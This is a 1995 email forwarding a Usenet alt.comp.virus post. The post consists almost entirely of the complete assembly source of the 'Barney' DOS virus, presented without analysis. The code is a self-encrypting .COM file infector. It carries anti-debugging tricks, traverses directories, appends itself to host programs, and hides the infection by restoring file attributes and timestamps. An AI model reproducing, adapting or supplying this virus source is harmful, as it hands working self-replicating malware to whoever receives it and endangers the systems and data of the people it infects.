From smtp Tue Feb  7 13:16 EST 1995
Received: from lynx.dac.neu.edu by POBOX.jwu.edu; Tue,  7 Feb 95 13:16 EST
Received: by lynx.dac.neu.edu (8.6.9/8.6.9) 
     id NAA08362 for joshuaw@pobox.jwu.edu; Tue, 7 Feb 1995 13:19:38 -0500
Date: Tue, 7 Feb 1995 13:19:38 -0500
From: lynx.dac.neu.edu!ekilby (Eric Kilby)
Content-Length: 8878
Content-Type: text
Message-Id: <199502071819.NAA08362@lynx.dac.neu.edu>
To: pobox.jwu.edu!joshuaw 
Subject: (fwd) Barney virus
Newsgroups: alt.comp.virus
Status: O

Path: chaos.dac.neu.edu!usenet.eel.ufl.edu!usenet.cis.ufl.edu!caen!newsxfer.itd.umich.edu!agate!howland.reston.ans.net!news.sprintlink.net!uunet!ankh.iia.org!danishm
From: danishm@iia.org ()
Newsgroups: alt.comp.virus
Subject: Barney virus
Date: 5 Feb 1995 22:06:47 GMT
Organization: International Internet Association.
Lines: 291
Message-ID: <3h3i5n$v4@ankh.iia.org>
NNTP-Posting-Host: iia.org
X-Newsreader: TIN [version 1.2 PL2]

Here is the Barney virus:


; Barney virus
PING            equ     0F92Fh
INFECT          equ     1

code            segment
                org     100h
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:

                mov     dx,VIRUS_SIZE / 2 + 1
                db      0BBh                    ; decryption module
code_offset     dw      offset virus_code

decrypt:
                db      02Eh,081h,37h           ; XOR CS:[BX]
cipher          dw      0
                inc     bx
                inc     bx
                dec     dx
                jnz     decrypt


virus_code:
                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                push    ds es

                cli
                mov     ax,PING           ; mild anti-trace code
                push    ax
                pop     ax
                dec     sp
                dec     sp
                pop     bx
                cmp     ax,bx
                je      no_trace
                hlt

no_trace:
                sti
                in      al,21h            ; lock out & reopen keyboard
                xor     al,2
                out     21h,al
                xor     al,2
                out     21h,al

                lea     dx,[bp + offset new_DTA]
                mov     ah,1Ah
                int     21h

                mov     byte ptr [bp + infections],0

                call    traverse

                pop     es ds
                mov     dx,80h
                mov     ah,1Ah
                int     21h

com_exit:
                lea     si,[bp + host]          ; restore host program
                mov     di,100h
                push    di
                movsw
                movsb

                call    fix_regs                ; fix up registers
                ret                             ; and leave

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret


traverse:
                sub     sp,64                   ; allocate stack space
                mov     si,sp
                inc     si
                mov     ah,47h                  ; get current directory
                xor     dl,dl
                int     21h

                dec     si
                mov     byte ptr ss:[si],'\' ; fix directory

next_dir:
                call    infect_dir

                cmp     byte ptr [bp + infections],INFECT
                je      traverse_done

                lea     dx,[bp + outer]         ; repeat in next dir up
                mov     ah,3Bh
                int     21h
                jnc     next_dir

traverse_done:
                add     sp,64                   ; reset
                mov     dx,si
                mov     ah,3Bh
                int     21h
                ret

infect_dir:
                mov     ah,4Eh
                lea     dx,[bp + find_me]
                int     21h
                jc      infect_done

next_file:
                lea     dx,[bp + new_DTA + 1Eh]
                call    execute
                cmp     byte ptr [bp + infections],INFECT
                je      infect_done
                mov     ah,4Fh
                int     21h
                jnc     next_file

infect_done:
                ret
execute:
                push    si

                xor     ax,ax                   ; critical error handler
                mov     es,ax                   ; routine - catch int 24
                lea     ax,[bp + int_24]
                mov     es:[24h * 4],ax
                mov     es:[24h * 4 + 2],cs

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                int     21h
                jc      cant_open
                xchg    bx,ax

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                mov     ah,3Fh
                mov     cx,28
                lea     dx,[bp + read_buffer]
                int     21h

                cmp     word ptr [bp + read_buffer],'ZM'
                je      dont_infect             ; .EXE, skip

                mov     al,2                    ; move to end of file
                call    move_file_ptr

                cmp     dx,65279 - (VIRUS_SIZE + 3)
                ja      dont_infect             ; too big, don't infect

                sub     dx,VIRUS_SIZE + 3       ; check for previous infection
                cmp     dx,word ptr [bp + read_buffer + 1]
                je      dont_infect

                add     dx,VIRUS_SIZE + 3
                mov     word ptr [bp + new_jump + 1],dx

                add     dx,103h
                call    encrypt_code            ; encrypt virus

                lea     dx,[bp + read_buffer]   ; save original program head
                int     21h
                mov     ah,40h                  ; write virus to file
                mov     cx,VIRUS_SIZE
                lea     dx,[bp + encrypt_buffer]
                int     21h

                xor     al,al                   ; back to beginning of file
                call    move_file_ptr

                lea     dx,[bp + new_jump]
                int     21h

fix_date_time:
                pop     dx cx
                mov     ax,5701h                ; restore file date/time
                int     21h

                inc     byte ptr [bp + infections]

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     si
                ret


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

move_file_ptr:
                mov     ah,42h                  ; move file pointer
                cwd
                xor     cx,cx
                int     21h

                mov     dx,ax                   ; set up registers
                mov     ah,40h
                mov     cx,3
                ret

courtesy_of     db      '[BW]',0
signature       db      'BARNEY (c) by HypoDermic!! Part of the Mayberry Family!!!',0


encrypt_code:
                push    ax cx

                push    dx
                xor     ah,ah                   ; get time for random number
                int     1Ah

                mov    [bp + cipher],dx
                pop     cx
                add     cx,virus_code - virus_begin
                mov     [bp + code_offset],cx
                push    cs                      ; ES = CS
                pop     es

                lea     si,[bp + virus_begin]
                lea     di,[bp + offset encrypt_buffer]
                mov     cx,virus_code - virus_begin
                rep     movsb

                mov     cx,VIRUS_SIZE / 2 + 1
encrypt:
                lodsw                           ; encrypt virus code
                xor     ax,dx
                stosw
                loop    encrypt

                pop     cx ax
                ret


find_me         db      '*.COM',0
outer           db      '..',0

int_24:
                mov     al,3                    ; int 24 handler
                iret
new_jump        db      0E9h,0,0

infections      db      0
virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
new_DTA         db      128 dup(?)
encrypt_buffer  db      VIRUS_SIZE dup (?)      ; encryption buffer

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start


--
Eric "Mad Dog" Kilby                                 maddog@ccs.neu.edu
The Great Sporkeus Maximus			     ekilby@lynx.dac.neu.edu
Student at the Northeatstern University College of Computer Science 
"I Can't Believe It's Not Butter"

